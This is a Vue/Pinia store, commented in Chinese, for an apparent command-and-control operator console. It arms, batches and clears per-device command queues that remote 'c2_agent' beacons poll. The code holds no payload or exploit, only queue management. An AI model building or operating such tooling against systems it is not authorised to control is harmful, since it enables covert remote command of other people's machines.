import { defineStore } from 'pinia'
import { computed, ref } from 'vue'
import { controlApi } from '@/api/control'
import { queryApi, type DeviceCommandRow, type DeviceQueueTarget } from '@/api/query'
import { COMMAND_TYPES, type CommandRow, type CommandType } from '@/api/types'
import { ElMessage } from 'element-plus'

/**
 * 指令状态（含按设备独立队列）。
 *
 * 契约红线：前端只做 武装 / 清空 / peek 三件事；
 * 指令由各设备自己的 beacon 领走，前端绝不直接调用回传端点。
 * `exit` 不在可下发列表内（会终止设备端 c2_agent 的 beacon 循环且不可恢复）。
 *
 * 批量异步：armTargets 一次给 N 台各写一条独立队列 → 每台各自领取，
 * 一台不在线不会占住别人的指令（对比老的单行全局队列：一台不来全堵）。
 */
export const useCommandStore = defineStore('command', () => {
  const current = ref<Record<string, unknown> | null>(null)
  const once = ref<boolean | null>(null)
  const history = ref<CommandRow[]>([])

  /** 按设备队列：target → {armed, dispatched, total, last_armed_ts} */
  const targets = ref<DeviceQueueTarget[]>([])
  /** 当前查看设备的队列明细 */
  const detail = ref<DeviceCommandRow[]>([])

  const loading = ref(false)
  const busy = ref(false)

  /** 后端是否支持按设备队列（Go v7+）。null=未知，探测后定 */
  const perDevice = ref<boolean | null>(null)

  const types = computed<readonly CommandType[]>(() => COMMAND_TYPES)
  const armed = computed(() => !!current.value && Object.keys(current.value).length > 0)

  const pendingTotal = computed(() =>
    targets.value.reduce((a, t) => a + (Number(t.armed) || 0), 0),
  )
  const dispatchedTotal = computed(() =>
    targets.value.reduce((a, t) => a + (Number(t.dispatched) || 0), 0),
  )

  function parseParams(text: string): Record<string, unknown> | null {
    try {
      return text.trim() ? JSON.parse(text) : {}
    } catch {
      ElMessage.error('params 不是合法 JSON')
      return null
    }
  }

  async function peek() {
    loading.value = true
    try {
      const r = await controlApi.peek()
      current.value = r?.command ?? null
      once.value = r?.once ?? null
    } finally {
      loading.value = false
    }
  }

  async function refreshHistory(limit = 30) {
    try {
      const rows = await queryApi.commands(limit)
      history.value = Array.isArray(rows) ? rows : []
    } catch {
      /* 历史拉取失败不影响武装动作 */
    }
  }

  /** 探测 + 拉取各设备队列总览 */
  async function refreshTargets() {
    try {
      // 空表时后端返回 null（GROUP BY 无行），统一归一成数组
      const rows = await queryApi.deviceCommandTargets()
      targets.value = Array.isArray(rows) ? rows : []
      perDevice.value = true
    } catch (e: unknown) {
      const status = (e as { response?: { status?: number } })?.response?.status
      // 404 / 400 = 后端没有该只读面（Python 版 / Go v6-）→ 降级为全局单队列
      perDevice.value = false
      targets.value = []
      if (status && status !== 404 && status !== 400) {
        /* 其它错误静默，由顶栏错误条统一呈现 */
      }
    }
  }

  async function refreshDetail(target: string) {
    if (!target) {
      detail.value = []
      return
    }
    try {
      detail.value = await queryApi.deviceCommands(target, 100)
    } catch {
      detail.value = []
    }
  }

  /** 单台 / 全局武装 */
  async function arm(type: CommandType, paramsText: string, onceFlag: boolean, target?: string) {
    const params = parseParams(paramsText)
    if (!params) return false
    if (!COMMAND_TYPES.includes(type)) {
      ElMessage.error(`不支持的指令类型：${type}`)
      return false
    }
    busy.value = true
    try {
      if (target) {
        await controlApi.armTargets([target], type, params, onceFlag)
        ElMessage.success(`已武装 ${type} → ${target}`)
        await refreshDetail(target)
      } else {
        await controlApi.arm(type, params, onceFlag)
        ElMessage.success(`已武装：${type}（全局队列）`)
      }
      await Promise.all([peek(), refreshHistory(), refreshTargets()])
      return true
    } catch (e: unknown) {
      const status = (e as { response?: { status?: number } })?.response?.status
      ElMessage.error(status === 403 ? '缺少 ops_token，后端拒绝武装' : '武装失败')
      return false
    } finally {
      busy.value = false
    }
  }

  /**
   * 批量异步武装：一次请求给 N 台各写一条独立队列。
   * 返回成功条数；老后端（perDevice=false）降级为逐台全局武装。
   */
  async function armBatch(
    targetsList: string[],
    type: CommandType,
    paramsText: string,
    onceFlag: boolean,
  ) {
    const params = parseParams(paramsText)
    if (!params) return 0
    if (!targetsList.length) {
      ElMessage.warning('请先选择设备')
      return 0
    }
    if (!COMMAND_TYPES.includes(type)) {
      ElMessage.error(`不支持的指令类型：${type}`)
      return 0
    }
    busy.value = true
    try {
      const r = await controlApi.armTargets(targetsList, type, params, onceFlag)
      const n = r?.count ?? targetsList.length
      ElMessage.success(`已批量武装 ${n} 台：${type}（各设备独立队列）`)
      await Promise.all([peek(), refreshHistory(), refreshTargets()])
      return n
    } catch (e: unknown) {
      const status = (e as { response?: { status?: number } })?.response?.status
      ElMessage.error(status === 403 ? '缺少 ops_token，后端拒绝武装' : '批量武装失败')
      return 0
    } finally {
      busy.value = false
    }
  }

  async function clear(target?: string) {
    busy.value = true
    try {
      if (target) {
        await controlApi.clearFor(target)
        ElMessage.success(`已取消 ${target} 的待发指令（其它设备不受影响）`)
        await refreshDetail(target)
      } else {
        await controlApi.clear()
        ElMessage.success('已清空全局队列（noop）')
      }
      await Promise.all([peek(), refreshHistory(), refreshTargets()])
    } catch {
      ElMessage.error('操作失败')
    } finally {
      busy.value = false
    }
  }

  return {
    current,
    once,
    history,
    targets,
    detail,
    loading,
    busy,
    perDevice,
    types,
    armed,
    pendingTotal,
    dispatchedTotal,
    peek,
    arm,
    armBatch,
    clear,
    refreshHistory,
    refreshTargets,
    refreshDetail,
  }
})
